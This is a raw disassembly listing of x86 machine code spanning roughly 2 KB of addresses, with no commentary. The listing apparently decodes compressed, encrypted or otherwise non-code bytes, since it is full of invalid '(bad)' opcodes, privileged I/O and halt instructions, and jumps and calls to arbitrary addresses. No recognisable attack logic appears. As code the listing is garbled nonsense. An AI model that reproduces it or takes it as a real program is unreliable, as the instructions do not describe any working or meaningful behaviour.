  40bc60:	xlat   BYTE PTR ds:[ebx]
  40bc61:	stc    
  40bc62:	std    
  40bc63:	sar    ebp,cl
  40bc65:	sar    DWORD PTR [ecx-0x60c003d],0xe7
  40bc6c:	(bad)  
  40bc6d:	aad    0xe0
  40bc6f:	fisttp WORD PTR ds:0xbffed0a
  40bc75:	retf   
  40bc76:	test   eax,0xf4b7c5c0
  40bc7b:	in     al,0xa8
  40bc7d:	out    0xd8,eax
  40bc7f:	shl    DWORD PTR [edi-0x43c4a4c],1
  40bc85:	loopne 0x40bc40
  40bc87:	fcmove st,st(6)
  40bc89:	add    esi,esi
  40bc8b:	lock fadd st,st(4)
  40bc8e:	ret    0xff9
  40bc91:	stc    
  40bc92:	(bad)  
  40bc94:	leave  
  40bc95:	stos   DWORD PTR es:[edi],eax
  40bc96:	loopne 0x40bc87
  40bc98:	in     al,dx
  40bc99:	out    0xca,al
  40bc9b:	iret   
  40bc9c:	fucomi st,st(3)
  40bc9e:	stc    
  40bc9f:	int    0xfe
  40bca1:	retf   0xf803
  40bca4:	leave  
  40bca5:	aam    0xf6
  40bca7:	aad    0xd5
  40bca9:	jecxz  0x40bca4
  40bcab:	aad    0xc0
  40bcad:	add    al,0xe0
  40bcaf:	paddd  mm0,mm7
  40bcb2:	enter  0xc903,0xce
  40bcb6:	jmp    0xcd2487a3
  40bcbb:	mov    ah,0xf0
  40bcbd:	(bad)  
  40bcbf:	aam    0xb9
  40bcc1:	mov    dh,0xf3
  40bcc3:	fmulp  st(1),st
  40bcc5:	shl    al,1
  40bcc7:	(bad)  
  40bcc8:	shl    dh,0xc2
  40bccb:	or     dl,cl
  40bccd:	fadd   QWORD PTR ds:0xed0fc5e5
  40bcd3:	fsub   st(7),st
  40bcd5:	jmp    0xc7e3:0xbcdce1b3
  40bcdc:	leave  
  40bcdd:	mov    dl,0xba
  40bcdf:	lods   eax,DWORD PTR ds:[esi]
  40bce0:	(bad)
  40bce3:	std    
  40bce4:	add    ebx,ebp
  40bce6:	cmc    
  40bce7:	out    0xd4,eax
  40bce9:	push   es
  40bcea:	in     eax,0xfc
  40bcec:	cld    
  40bced:	fmul   st(0),st
  40bcef:	(bad)  
  40bcf0:	add    edi,eax
  40bcf2:	pop    es
  40bcf3:	std    
  40bcf4:	stc    
  40bcf5:	ret    0xcce9
  40bcf8:	mov    dl,0xc9
  40bcfa:	call   0xccf68bcc
  40bcff:	repnz iret 
  40bd01:	ror    ah,cl
  40bd03:	lock std 
  40bd05:	fcmove st,st(5)
  40bd07:	std    
  40bd08:	loopne 0x40bd09
  40bd0a:	(bad)  
  40bd0b:	loope  0x40bd07
  40bd0d:	add    bl,bl
  40bd0f:	rcr    cl,0xc
  40bd12:	push   cs
  40bd13:	shl    ecx,0xea
  40bd16:	loope  0x40bd00
  40bd18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd19:	in     eax,dx
  40bd1a:	mov    ah,0xed
  40bd1c:	aam    0xb3
  40bd1e:	in     al,dx
  40bd1f:	stc    
  40bd20:	mov    al,0xde
  40bd22:	sti    
  40bd23:	loop   0x40bcf4
  40bd25:	jecxz  0x40bd19
  40bd27:	repz fdivrp st(3),st
  40bd2a:	(bad)  
  40bd2b:	fisttp DWORD PTR [edx]
  40bd2d:	lock call 0xfd2d9e17
  40bd33:	push   cs
  40bd34:	add    ah,BYTE PTR [edi-0x2d0d1f3b]
  40bd3a:	out    0xe8,eax
  40bd3c:	sti    
  40bd3d:	in     al,dx
  40bd3e:	aad    0xd9
  40bd40:	jmp    0xf6377a21
  40bd45:	stc    
  40bd46:	(bad)  
  40bd48:	push   es
  40bd49:	in     eax,dx
  40bd4a:	add    al,0xd9
  40bd4c:	(bad)  
  40bd4d:	shr    ebx,1
  40bd4f:	not    ah
  40bd51:	enter  0xcfcd,0x3
  40bd55:	fcom   st(7)
  40bd57:	repz int3 
  40bd59:	ret    0xe5f0
  40bd5c:	hlt    
  40bd5d:	jmp    0xda2ea937
  40bd62:	hlt    
  40bd63:	mov    ah,0xd2
  40bd65:	int    0xc3
  40bd67:	cld    
  40bd68:	mov    ebp,0xfad4e3fe
  40bd6d:	rol    DWORD PTR [ebx],0xc4
  40bd70:	loop   0x40bd5d
  40bd72:	into   
  40bd73:	pop    es
  40bd74:	out    dx,al
  40bd75:	fcomp  st(6)
  40bd77:	mov    al,0xc0
  40bd79:	ret    
  40bd7a:	ret    0xfadb
  40bd7d:	shr    esp,0xf8
  40bd80:	mov    ebx,0xf7cfcfeb
  40bd85:	fxch   st(4)
  40bd87:	fdivr  st(0),st
  40bd89:	lock ret 0xc6cb
  40bd8d:	lds    eax,FWORD PTR [edi]
  40bd8f:	pop    es
  40bd90:	or     esi,ebp
  40bd92:	retf   
  40bd93:	out    0x1,al
  40bd95:	(bad)  
  40bd96:	into   
  40bd97:	shl    BYTE PTR [edi-0x1f3a331d],0xeb
  40bd9e:	(bad)  
  40bd9f:	jmp    0xeb1d775e
  40bda4:	into   
  40bda5:	(bad)  
  40bda6:	in     al,dx
  40bda7:	repz push es
  40bda9:	stc    
  40bdaa:	add    ebp,edx
  40bdac:	pop    es
  40bdad:	push   es
  40bdae:	add    bh,dh
  40bdb0:	retf   0x7ed
  40bdb3:	out    dx,al
  40bdb4:	cld    
  40bdb5:	mov    esi,0xd7cdd6f3
  40bdba:	loope  0x40bda6
  40bdbc:	not    al
  40bdbe:	shl    esi,1
  40bdc0:	(bad)  
  40bdc2:	stc    
  40bdc3:	lock ret 0xf4be
  40bdc7:	fdivr  st,st(5)
  40bdc9:	mov    edi,0x8eac2d3
  40bdce:	fisttp DWORD PTR [eax]
  40bdd0:	add    bl,ah
  40bdd2:	hlt    
  40bdd3:	call   0xd721b0b7
  40bdd8:	(bad)  
  40bdd9:	shr    BYTE PTR [esi-0x4f3e1453],cl
  40bddf:	mov    edx,0x2fbe5d8
  40bde4:	repnz in eax,dx
  40bde6:	add    ecx,ebp
  40bde8:	out    dx,al
  40bde9:	pop    es
  40bdea:	rol    ebp,cl
  40bdec:	test   DWORD PTR [eax],0xfac6e6f9
  40bdf2:	push   es
  40bdf3:	(bad)  
  40bdf5:	in     eax,dx
  40bdf6:	loope  0x40bdb9
  40bdf8:	into   
  40bdf9:	loope  0x40bdad
  40bdfb:	lods   eax,DWORD PTR ds:[esi]
  40bdfc:	repnz ror bh,0xcf
  40be00:	repnz fidivr DWORD PTR [ebx-0xe242925]
  40be07:	(bad)  
  40be08:	out    dx,al
  40be09:	sar    DWORD PTR [esi-0x27fd0f35],0xee
  40be10:	(bad)  
  40be11:	loopne 0x40bdf5
  40be13:	pop    es
  40be14:	loopne 0x40bddb
  40be16:	fsub   st,st(4)
  40be18:	mov    ebp,0xeed6efe1
  40be1d:	lock retf 
  40be1f:	icebp  
  40be20:	lods   al,BYTE PTR ds:[esi]
  40be21:	jmp    0xe2fb88e1
  40be26:	add    bh,bh
  40be28:	(bad)  
  40be29:	add    eax,0xe303d604
  40be2e:	(bad)  
  40be2f:	fiadd  DWORD PTR [ebx]
  40be31:	in     al,dx
  40be32:	fiadd  WORD PTR [eax]
  40be34:	push   cs
  40be35:	out    0xc5,eax
  40be37:	loope  0x40be29
  40be39:	lock icebp 
  40be3b:	test   esp,0xb0c4caea
  40be41:	fcmovbe st,st(7)
  40be43:	mov    cl,0xf1
  40be45:	add    BYTE PTR [esi-0x206080e],bh
  40be4b:	mov    esp,0xd6e603da
  40be50:	or     BYTE PTR [edi],al
  40be52:	in     al,dx
  40be53:	retf   0xd0ff
  40be56:	shr    ch,0xf5
  40be59:	mov    dh,0xd7
  40be5b:	imul   DWORD PTR [eax-0x41253a28]
  40be61:	leave  
  40be62:	cld    
  40be63:	bnd ret 0xf7e0
  40be67:	mov    esi,0xd4dbe2f1
  40be6c:	in     eax,0xdc
  40be6e:	xlat   BYTE PTR ds:[ebx]
  40be6f:	retf   
  40be70:	(bad)  
  40be72:	or     al,0x7
  40be74:	call   0xd7029647
  40be79:	lods   eax,DWORD PTR ds:[esi]
  40be7a:	enter  0xb3c8,0xb4
  40be7e:	retf   0xcadf
  40be81:	into   
  40be82:	(bad)  
  40be83:	mov    esp,0xf4f103b8
  40be88:	cli    
  40be89:	out    0xe3,eax
  40be8b:	jmp    0x40be6b
  40be8d:	ret    
  40be8e:	add    al,0x5
  40be90:	call   0xd327b1a4
  40be95:	ret    
  40be96:	in     al,dx
  40be97:	xlat   BYTE PTR ds:[ebx]
  40be98:	icebp  
  40be99:	mov    dl,0xeb
  40be9b:	mov    ebx,0xb6d5e5d0
  40bea0:	cmc    
  40bea1:	cld    
  40bea2:	mov    ebp,0xf8d2cce8
  40bea7:	neg    ch
  40bea9:	sar    edx,0xd4
  40beac:	jmp    0xf93e9b91
  40beb1:	into   
  40beb2:	in     eax,0xcd
  40beb4:	cli    
  40beb5:	loop   0x40be82
  40beb7:	les    esi,FWORD PTR [esi-0x81f4c1f]
  40bebd:	shl    edx,0xdf
  40bec0:	(bad)  
  40bec2:	lock add edi,ebx
  40bec5:	leave  
  40bec6:	loop   0x40bea7
  40bec8:	(bad)  
  40beca:	aam    0xc0
  40becc:	mov    DWORD PTR [eax+eiz*8],0xfefbe0de
  40bed3:	vpaddusb xmm5,xmm0,XMMWORD PTR [eax-0xa534c13]
  40bedb:	mov    dl,0xfb
  40bedd:	leave  
  40bede:	rol    ebp,1
  40bee0:	int3   
  40bee1:	mov    esi,0xf0e1dabc
  40bee6:	add    ah,cl
  40bee8:	add    edi,esp
  40beea:	fstp   st(1)
  40beec:	add    al,0x1
  40beee:	loope  0x40bef6
  40bef0:	or     BYTE PTR ds:0xa7e70f0f,al
  40bef6:	repnz mov bl,0xf0
  40bef9:	jmp    0xf4f892b5
  40befe:	not    edi
  40bf00:	mov    esi,0xdefeb2c4
  40bf05:	(bad)  
  40bf07:	mov    ebp,0xe7f2f0e2
  40bf0c:	add    al,BYTE PTR [esi]
  40bf0e:	jecxz  0x40bf11
  40bf10:	into   
  40bf11:	cmc    
  40bf12:	(bad)  
  40bf13:	(bad)  
  40bf15:	out    0xc8,al
  40bf17:	vcmpps ymm6,ymm3,ymm5,0xf6
  40bf1c:	aad    0xce
  40bf1e:	xlat   BYTE PTR ds:[ebx]
  40bf1f:	jmp    0x40befa
  40bf21:	aad    0xff
  40bf23:	jmp    0x40befe
  40bf25:	add    al,bl
  40bf27:	ret    0xdbf9
  40bf2a:	(bad)  
  40bf2c:	xlat   BYTE PTR ds:[ebx]
  40bf2d:	or     ecx,eax
  40bf2f:	retf   0xfe0
  40bf32:	add    ah,bl
  40bf34:	loopne 0x40bf04
  40bf36:	lods   al,BYTE PTR ds:[esi]
  40bf37:	jmp    0xc6f47d26
  40bf3c:	(bad)  
  40bf3d:	mov    al,0xb8
  40bf3f:	leave  
  40bf40:	jmp    0xcd2e9714
  40bf45:	ret    
  40bf46:	repnz neg cl
  40bf49:	cli    
  40bf4a:	or     eax,ecx
  40bf4c:	rol    BYTE PTR [ebx],0xd5
  40bf4f:	fdivr  st,st(4)
  40bf51:	push   es
  40bf52:	add    ch,cl
  40bf54:	jmp    0xc42fb017
  40bf59:	ret    
  40bf5a:	shl    BYTE PTR [ecx-0xc052e54],1
  40bf60:	lds    edi,FWORD PTR [esi-0x44364542]
  40bf66:	rol    edi,cl
  40bf68:	shl    ecx,1
  40bf6a:	jmp    0x40bf33
  40bf6c:	add    al,0xf0
  40bf6e:	test   cl,0xe8
  40bf71:	call   0xb40fa685
  40bf76:	test   al,0xd6
  40bf78:	mov    ebp,0xdbf1f3f0
  40bf7d:	mov    dl,0xae
  40bf7f:	(bad)  
  40bf80:	dec    eax
  40bf82:	aad    0xcc
  40bf84:	std    
  40bf85:	fcmovb st,st(0)
  40bf87:	mov    eax,0xff0502b8
  40bf8c:	aam    0x9
  40bf8e:	shr    esi,0xee
  40bf91:	cli    
  40bf92:	cld    
  40bf93:	pop    es
  40bf94:	add    dh,BYTE PTR [ecx-0x35371417]
  40bf9a:	out    0xb7,al
  40bf9c:	shl    DWORD PTR [edi-0x2f17242b],cl
  40bfa2:	shr    edx,cl
  40bfa4:	fdivrp st(1),st
  40bfa6:	shl    ebx,1
  40bfa8:	shl    esi,cl
  40bfaa:	ret    
  40bfab:	push   es
  40bfac:	jmp    0xe43fb677
  40bfb1:	retf   
  40bfb2:	add    BYTE PTR [edi],al
  40bfb4:	retf   
  40bfb5:	retf   0xbdca
  40bfb8:	int3   
  40bfb9:	scas   eax,DWORD PTR es:[edi]
  40bfba:	cmc    
  40bfbb:	mov    dh,0xec
  40bfbd:	in     al,0xb7
  40bfbf:	push   DWORD PTR [esi-0x4b414d35]
  40bfc5:	in     al,dx
  40bfc6:	fadd   st(7),st
  40bfc8:	lock cli 
  40bfca:	mov    esp,0xe0c4d9cb
  40bfcf:	(bad)  
  40bfd0:	fcomp  st(5)
  40bfd2:	jmp    0x40bfae
  40bfd4:	int    0xe8
  40bfd6:	out    dx,al
  40bfd7:	jmp    0x40bf87
  40bfd9:	icebp  
  40bfda:	into   
  40bfdb:	leave  
  40bfdc:	mov    ah,0xb4
  40bfde:	mov    cl,0xc4
  40bfe0:	fdivp  st(7),st
  40bfe2:	mov    ch,0xd0
  40bfe4:	retf   0xcdb9
  40bfe7:	add    al,bl
  40bfe9:	shl    ch,0xdb
  40bfec:	rcr    ah,1
  40bfee:	out    0xbd,eax
  40bff0:	call   0xd33aaca
  40bff5:	(bad)  
  40bff6:	rol    dl,cl
  40bff8:	int3   
  40bff9:	icebp  
  40bffa:	xlat   BYTE PTR ds:[ebx]
  40bffb:	(bad)
  40bffe:	shl    esi,1
  40c000:	repnz mov ch,0xb8
  40c003:	div    dh
  40c005:	int    0xf6
  40c007:	jecxz  0x40bfd5
  40c009:	loop   0x40bfef
  40c00b:	test   BYTE PTR [edx],0xde
  40c00e:	in     al,0xf4
  40c010:	push   cs
  40c011:	(bad)  
  40c012:	fisttp QWORD PTR ds:0xdfafe912
  40c018:	out    0xf4,al
  40c01a:	leave  
  40c01b:	hlt    
  40c01c:	int    0xe1
  40c01e:	in     al,dx
  40c01f:	iret   
  40c020:	shl    BYTE PTR [ebx-0x302222],cl
  40c026:	mov    ecx,0xf2d1d2f3
  40c02b:	sti    
  40c02c:	(bad)  
  40c02e:	rcl    esp,0x2
  40c031:	(bad)  
  40c033:	iret   
  40c034:	int    0xef
  40c036:	fmul   st(7),st
  40c038:	xlat   BYTE PTR ds:[ebx]
  40c039:	shl    DWORD PTR [eax-0x2d281818],cl
  40c03f:	mov    edi,0xbef6cefe
  40c044:	(bad)  
  40c045:	mov    bh,0xfb
  40c047:	out    0x0,al
  40c049:	in     al,0xd2
  40c04b:	in     al,0x9
  40c04d:	test   ebp,0xebf8d6e2
  40c053:	jmp    0xbcbc:0xbcbeb2e7
  40c05a:	shl    ebx,1
  40c05c:	cli    
  40c05d:	vpmaddwd xmm5,xmm1,xmm0
  40c061:	cmc    
  40c062:	jmp    0xffcd:0xf2fdd0d9
  40c069:	add    edx,edx
  40c06b:	rcl    ch,0xc7
  40c06e:	fdiv   st(7),st
  40c070:	in     eax,0xd9
  40c072:	adc    eax,DWORD PTR [ebx+edx*8]
  40c075:	retf   
  40c076:	lods   al,BYTE PTR ds:[esi]
  40c077:	ror    al,cl
  40c079:	leave  
  40c07a:	int3   
  40c07b:	sar    BYTE PTR [edx-0x2d3a2a29],1
  40c081:	(bad)  
  40c083:	ror    ebp,1
  40c085:	fsub   st,st(2)
  40c087:	fistp  QWORD PTR [eax-0xd2efa21]
  40c08d:	add    cl,cl
  40c08f:	out    dx,al
  40c090:	bswap  edi
  40c092:	int3   
  40c093:	repz fsubr st,st(0)
  40c096:	loope  0x40c06f
  40c098:	loop   0x40c070
  40c09a:	jmp    0xf0f1a153
  40c09f:	rcl    esi,cl
  40c0a1:	jmp    0xdaba:0x2ffede4
  40c0a8:	fcomp  st(6)
  40c0aa:	add    al,ah
  40c0ac:	loope  0x40c07f
  40c0ae:	out    0xe5,eax
  40c0b0:	fsubrp st(1),st
  40c0b2:	iret   
  40c0b3:	jmp    0xb3a4:0xa9e8a8f1
  40c0ba:	lds    ebp,FWORD PTR [ebx+ebp*8-0xa4e3518]
  40c0c1:	icebp  
  40c0c2:	imul   eax
  40c0c4:	iret   
  40c0c5:	int    0xbc
  40c0c7:	idiv   bh
  40c0c9:	push   es
  40c0ca:	aad    0xd0
  40c0cc:	fsubp  st(1),st
  40c0ce:	loopne 0x40c08d
  40c0d0:	inc    esi
  40c0d2:	jmp    0xddc2:0xecdc0508
  40c0d9:	scas   al,BYTE PTR es:[edi]
  40c0da:	mov    ch,0xc2
  40c0dc:	ret    0xd5b5
  40c0df:	push   DWORD PTR [eax-0x5260b22]
  40c0e5:	mov    ebp,0xffe7d4d0
  40c0ea:	add    al,BYTE PTR [esi]
  40c0ec:	ror    cl,0xc9
  40c0ef:	hlt    
  40c0f0:	or     eax,ecx
  40c0f2:	int    0xed
  40c0f4:	add    ch,cl
  40c0f6:	rol    bl,0xcb
  40c0f9:	retf   
  40c0fa:	in     al,0xb6
  40c0fc:	mov    dl,0xe6
  40c0fe:	enter  0xd3e8,0xbb
  40c102:	cli    
  40c103:	jmp    0xcccd:0xe0e2fdd9
  40c10a:	lock (bad) 
  40c10c:	rol    cl,cl
  40c10e:	loope  0x40c0e7
  40c110:	add    esp,ebp
  40c112:	add    al,0xff
  40c114:	push   cs
  40c115:	(bad)  
  40c117:	out    dx,al
  40c118:	lods   eax,DWORD PTR ds:[esi]
  40c119:	aad    0xb1
  40c11b:	aad    0xd4
  40c11d:	loopne 0x40c0e7
  40c11f:	sar    BYTE PTR [edi-0x44fc071c],1
  40c125:	icebp  
  40c126:	fsubr  st,st(6)
  40c128:	loope  0x40c11a
  40c12a:	(bad)  
  40c12c:	clc    
  40c12d:	clc    
  40c12e:	mov    bh,0x2
  40c131:	out    0xd8,eax
  40c133:	or     DWORD PTR [esi],ecx
  40c135:	mov    bl,0xbe
  40c137:	retf   0xebe5
  40c13a:	lock ror bl,cl
  40c13d:	out    dx,eax
  40c13e:	in     eax,dx
  40c13f:	fdiv   DWORD PTR [eax-0x35462b09]
  40c145:	mov    edi,0xfff8cff1
  40c14a:	add    eax,0xf60ac0dd
  40c14f:	(bad)  
  40c151:	aam    0xff
  40c153:	in     eax,dx
  40c154:	retf   0xeee7
  40c157:	mov    cl,0xb1
  40c159:	in     al,0xd2
  40c15b:	iret   
  40c15c:	jmp    0x40c127
  40c15e:	clc    
  40c15f:	(bad)  
  40c160:	leave  
  40c161:	shl    BYTE PTR [esp+ebp*8+0x1dbe0df],1
  40c168:	fdivr  DWORD PTR [ebp-0x3efa001f]
  40c16e:	hlt    
  40c16f:	fdivr  st,st(6)
  40c171:	add    ecx,DWORD PTR ds:0xc5e70f02
  40c177:	out    0xe2,al
  40c179:	in     al,dx
  40c17a:	mul    eax
  40c17c:	(bad)  
  40c17e:	mov    cl,0xef
  40c180:	fidiv  WORD PTR [esi+esi*4-0x32fc2502]
  40c187:	int3   
  40c188:	not    ah
  40c18a:	(bad)  
  40c18b:	cmc    
  40c18c:	hlt    
  40c18d:	add    esp,esp
  40c18f:	fmul   st,st(3)
  40c191:	loopne 0x40c191
  40c193:	into   
  40c194:	int    0xe8
  40c196:	loop   0x40c144
  40c198:	imul   esp
  40c19a:	leave  
  40c19b:	in     al,dx
  40c19c:	(bad)  
  40c19d:	mov    bh,0xb1
  40c19f:	aam    0xc6
  40c1a1:	mov    bh,0xcb
  40c1a3:	repnz mov al,0xfe
  40c1a6:	sar    ebx,cl
  40c1a8:	inc    BYTE PTR [edi]
  40c1aa:	add    al,0xf4
  40c1ac:	lock sti 
  40c1ae:	jmp    0xd2ee:0xee0afede
  40c1b5:	out    dx,eax
  40c1b6:	ret    0xded1
  40c1b9:	rol    esi,1
  40c1bb:	mov    dl,0xf2
  40c1bd:	aam    0xcf
  40c1bf:	(bad)
  40c1c2:	mov    eax,0xd6f8c8de
  40c1c7:	push   esp
  40c1c9:	(bad)  
  40c1ca:	mov    esp,0xfbcac1f5
  40c1cf:	jecxz  0x40c1b1
  40c1d1:	out    dx,eax
  40c1d2:	loopne 0x40c1a1
  40c1d4:	repz lock jmp 0xf6d3:0xeecaeadc
  40c1dd:	(bad)  
  40c1df:	clc    
  40c1e0:	in     eax,dx
  40c1e1:	repnz icebp 
  40c1e3:	clc    
  40c1e4:	loop   0x40c1e8
  40c1e6:	fcomip st,st(0)
  40c1e8:	mov    esi,0xe5dae0c6
  40c1ed:	(bad)  
  40c1ef:	sti    
  40c1f0:	jecxz  0x40c1ce
  40c1f2:	fisttp WORD PTR [ecx]
  40c1f4:	push   cs
  40c1f5:	out    0xb2,eax
  40c1f7:	rcl    ebx,cl
  40c1f9:	in     eax,dx
  40c1fa:	(bad)
  40c1fd:	mov    edx,0xb5fad6f1
  40c202:	mov    dh,0xe3
  40c204:	aam    0xf1
  40c206:	(bad)  
  40c208:	mov    eax,0x1c2dfd7
  40c20d:	cli    
  40c20e:	sar    edx,0xc9
  40c211:	in     al,dx
  40c212:	out    dx,eax
  40c213:	loopne 0x40c1e2
  40c215:	mov    ebp,0xe4c7aea9
  40c21a:	rol    al,0xea
  40c21d:	int3   
  40c21e:	clc    
  40c21f:	mov    ah,0xc6
  40c221:	in     eax,0xce
  40c223:	mov    ebx,0xf6d9deec
  40c228:	aad    0xf4
  40c22a:	out    0xea,al
  40c22c:	fdivp  st(5),st
  40c22e:	fld1   
  40c230:	or     ebx,eax
  40c232:	jecxz  0x40c235
  40c234:	or     ecx,edx
  40c236:	test   al,0xe1
  40c238:	ret    0xf5e9
  40c23b:	cli    
  40c23c:	lods   al,BYTE PTR ds:[esi]
  40c23d:	aad    0xd1
  40c23f:	in     al,0xbb
  40c241:	(bad)  
  40c242:	repz fdivr DWORD PTR [ebx-0xa1c1c42]
  40c249:	(bad)  
  40c24a:	stc    
  40c24b:	add    eax,0xe2efe0ff
  40c250:	out    dx,eax
  40c251:	jmp    0xf0b1:0xbff8fe08
  40c258:	mov    esi,0xebf6e6e6
  40c25d:	cli    
  40c25e:	clc    
  40c25f:	mov    edi,0xd4b8d9cc
  40c264:	bnd ret 
  40c266:	mov    dh,0xfa
  40c268:	(bad)  
  40c26a:	mov    BYTE PTR [eax],0xd1
  40c26d:	mov    edi,0xe0c4eae8
  40c272:	bswap  ebx
  40c274:	int3   
  40c275:	ret    
  40c276:	rol    dh,1
  40c278:	int3   
  40c279:	into   
  40c27a:	loop   0x40c241
  40c27c:	(bad)  
  40c27d:	aam    0xe4
  40c27f:	mov    dh,0xce
  40c281:	iret   
  40c282:	fdivr  st(1),st
  40c284:	cld    
  40c285:	add    ch,bh
  40c287:	mov    ch,0xd8
  40c289:	add    eax,0xdfc2fef9
  40c28e:	out    dx,eax
  40c28f:	cld    
  40c290:	out    dx,eax
  40c291:	std    
  40c292:	fcom   st(3)
  40c294:	in     eax,dx
  40c295:	in     eax,dx
  40c296:	ret    
  40c297:	out    0xa8,al
  40c299:	ret    
  40c29a:	mul    bh
  40c29c:	out    dx,eax
  40c29d:	mov    ecx,0xfde8d4d5
  40c2a2:	enter  0xccfc,0xdc
  40c2a6:	mov    dh,0xc3
  40c2a8:	stc    
  40c2a9:	mov    ebp,0xea0bc3c4
  40c2ae:	loope  0x40c277
  40c2b0:	clc    
  40c2b1:	retf   
  40c2b2:	fimul  WORD PTR [ecx+eiz*8]
  40c2b5:	ret    0xe9e5
  40c2b8:	leave  
  40c2b9:	scas   al,BYTE PTR es:[edi]
  40c2ba:	sti    
  40c2bb:	jmp    0xe00f9774
  40c2c0:	not    ebp
  40c2c2:	shl    al,1
  40c2c4:	jecxz  0x40c289
  40c2c6:	out    0xdd,eax
  40c2c8:	cmc    
  40c2c9:	int    0xfe
  40c2cb:	std    
  40c2cc:	add    edi,edx
  40c2ce:	jmp    0xca0f:0xcecf0ef6
  40c2d5:	test   al,0xb2
  40c2d7:	shl    ah,1
  40c2d9:	mov    ebp,0xc8b7f2d1
  40c2de:	(bad)  
  40c2df:	mov    edx,0xb4ccb6f1
  40c2e4:	out    dx,al
  40c2e5:	rcr    ebx,1
  40c2e7:	clc    
  40c2e8:	icebp  
  40c2e9:	rcl    cl,0xd3
  40c2ec:	in     eax,0xe2
  40c2ee:	(bad)  
  40c2f0:	add    bl,bl
  40c2f2:	repz jecxz 0x40c2e4
  40c2f5:	mov    esp,0xcbcbe4d1
  40c2fa:	out    0xb0,eax
  40c2fc:	mov    ebx,0xe4f3cab1
  40c301:	retf   
  40c302:	into   
  40c303:	call   0xda29bf09
  40c308:	int3   
  40c309:	repnz in al,0x2
  40c30c:	push   es
  40c30d:	retf   
  40c30e:	push   es
  40c30f:	sti    
  40c310:	(bad)  
  40c312:	or     eax,0xcac6e3e4
  40c317:	in     eax,0xd6
  40c319:	stos   DWORD PTR es:[edi],eax
  40c31a:	fcmovnb st,st(2)
  40c31c:	test   al,0xc6
  40c31e:	mov    edx,0xf5cab0d4
  40c323:	retf   
  40c324:	out    dx,eax
  40c325:	call   0xf442ab28
  40c32a:	cli    
  40c32b:	ret    
  40c32c:	loope  0x40c32f
  40c32e:	imul   esi
  40c330:	iret   
  40c331:	out    dx,eax
  40c332:	fcmovne st,st(5)
  40c334:	fsubr  QWORD PTR [edi+ebp*8-0x282f3117]
  40c33b:	retf   
  40c33c:	(bad)  
  40c33d:	retf   0xb1d7
  40c340:	aam    0xeb
  40c342:	leave  
  40c343:	std    
  40c344:	leave  
  40c345:	not    cl
  40c347:	ret    0xf4bd
  40c34a:	out    0xe6,eax
  40c34c:	jmp    0x40c32d
  40c34e:	add    edi,eax
  40c350:	fmulp  st(2),st
  40c352:	stc    
  40c353:	fadd   DWORD PTR [eax+ebp*8]
  40c356:	mov    dl,0xb7
  40c358:	jmp    0x40c331
  40c35a:	mov    dl,0xf6
  40c35c:	iret   
  40c35d:	mov    bl,0xd6
  40c35f:	jmp    0xef2ea956
  40c364:	mov    ebp,0xb4f8c0d1
  40c369:	stc    
  40c36a:	out    0xd5,eax
  40c36c:	or     dh,bh
  40c36e:	push   es
  40c36f:	leave  
  40c370:	fimul  WORD PTR [ecx]
  40c372:	iret   
  40c373:	or     eax,0xecb3af11
  40c378:	imul   BYTE PTR [esi-0x36083f12]
  40c37e:	mov    al,0xdf
  40c380:	ror    bl,cl
  40c382:	idiv   ecx
  40c384:	aam    0xf1
  40c386:	int    0xe1
  40c388:	stc    
  40c389:	pop    es
  40c38a:	fdivp  st(0),st
  40c38c:	add    DWORD PTR [esi],eax
  40c38e:	or     ebx,ebp
  40c390:	(bad)  
  40c391:	sti    
  40c392:	in     eax,0xe1
  40c394:	in     eax,dx
  40c395:	jmp    0xf7fda95c
  40c39a:	out    dx,al
  40c39b:	jecxz  0x40c384
  40c39d:	(bad)  
  40c39e:	out    0xb4,eax
  40c3a0:	sti    
  40c3a1:	mov    ebx,0xf0fed4f2
  40c3a6:	fcom   st(4)
  40c3a8:	in     eax,0xd7
  40c3aa:	out    0xbc,al
  40c3ac:	fdivrp st(1),st
  40c3ae:	fsincos 
  40c3b0:	jmp    0x40c3a0
  40c3b2:	aam    0xc
  40c3b4:	out    dx,al
  40c3b5:	mov    dl,0xce
  40c3b7:	mov    ebp,0xe6f1e7c4
  40c3bc:	xlat   BYTE PTR ds:[ebx]
  40c3bd:	mov    dh,0xed
  40c3bf:	in     al,dx
  40c3c0:	fnstenv [ebx-0x480c444e]
  40c3c6:	hlt    
  40c3c7:	shl    eax,1
  40c3c9:	in     eax,dx
  40c3ca:	rcl    eax,0xb8
  40c3cd:	ret    0xebdd
  40c3d0:	jmp    0xaaf2:0xeefdd808
  40c3d7:	div    eax
  40c3d9:	idiv   ebx
  40c3db:	call   0xc532b39b
  40c3e0:	lds    edi,FWORD PTR [ecx-0x26102e2e]
  40c3e6:	out    dx,eax
  40c3e7:	lock fcmovne st,st(4)
  40c3ea:	mov    esi,0xe4f5f9e0
  40c3ef:	stc    
  40c3f0:	(bad)  
  40c3f2:	add    al,0xe5
  40c3f4:	les    esi,FWORD PTR [ecx-0x160a1857]
  40c3fa:	mov    cl,0xee
  40c3fc:	in     eax,dx
  40c3fd:	repnz in al,dx
  40c3ff:	fdivr  st,st(0)
  40c401:	(bad)  
  40c402:	fdivr  st,st(2)
  40c404:	out    dx,al
  40c405:	mov    bh,0xde
  40c407:	fild   WORD PTR [edx]
  40c409:	cli    
  40c40a:	(bad)  
  40c40b:	lock xlat BYTE PTR ds:[ebx]
  40c40d:	shr    edi,1
  40c40f:	(bad)  
  40c410:	cli    
  40c411:	or     dl,cl
  40c413:	loopne 0x40c408
  40c415:	(bad)  [ecx-0x1f10312e]
  40c41b:	(bad)  
  40c41c:	out    dx,eax
  40c41d:	mov    bl,0xc8
  40c41f:	ffreep st(4)
  40c421:	cld    
  40c422:	jmp    0x40c3f4
  40c424:	push   edx
  40c426:	fdiv   QWORD PTR [ebp-0x1f1dfb07]
  40c42c:	ret    0xbee0
  40c42f:	hlt    
  40c430:	fcmove st,st(1)
  40c432:	hlt    
  40c433:	jmp    0xf32b6e3c
  40c438:	icebp  
  40c439:	rcl    ch,cl
  40c43b:	loop   0x40c42e
  40c43d:	shl    DWORD PTR [ebx+ecx*8-0x344b0118],1
  40c444:	jmp    0xbf278d47
  40c449:	fild   WORD PTR [ecx]
  40c44b:	add    esp,esp
  40c44d:	jmp    0xe4fb:0xf0bf7c4
  40c454:	cld    
  40c455:	ror    edx,cl
  40c457:	test   al,0xf7
  40c459:	ret    0xcff5
  40c45c:	out    dx,eax
  40c45d:	stc    
  40c45e:	(bad)  
  40c45f:	fcmovnu st,st(1)
  40c461:	icebp  
  40c462:	ror    bl,1
  40c464:	stc    
  40c465:	std    
